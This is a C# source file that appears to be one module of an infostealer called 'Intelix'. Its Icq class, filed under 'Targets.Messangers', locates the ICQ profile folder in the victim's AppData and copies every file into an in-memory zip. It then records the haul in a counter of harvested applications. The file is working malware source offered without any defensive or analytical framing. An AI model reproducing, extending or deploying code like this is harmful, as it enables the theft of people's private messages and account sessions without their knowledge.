using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers;

public class Icq : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ICQ", "0001");
		if (Directory.Exists(text))
		{
			string text2 = "ICQ\\0001";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "ICQ";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Messangers.Add(counterApplications);
		}
	}
}
